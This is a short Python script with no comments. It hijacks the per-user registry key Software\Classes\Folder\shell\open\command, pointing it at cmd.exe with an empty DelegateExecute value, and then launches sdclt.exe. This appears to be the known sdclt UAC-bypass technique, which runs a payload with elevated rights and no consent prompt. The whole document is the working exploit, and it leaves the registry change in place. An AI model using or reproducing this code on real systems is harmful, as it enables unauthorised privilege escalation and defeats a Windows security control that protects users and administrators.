import winreg, subprocess

payload = r"C:\\Windows\\System32\\cmd.exe"
key_path = r"Software\\Classes\\Folder\\shell\\open\\command"
key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
winreg.SetValueEx(key, None, 0, winreg.REG_SZ, payload)
winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
winreg.CloseKey(key)
subprocess.Popen(["C:\\Windows\\System32\\sdclt.exe"])
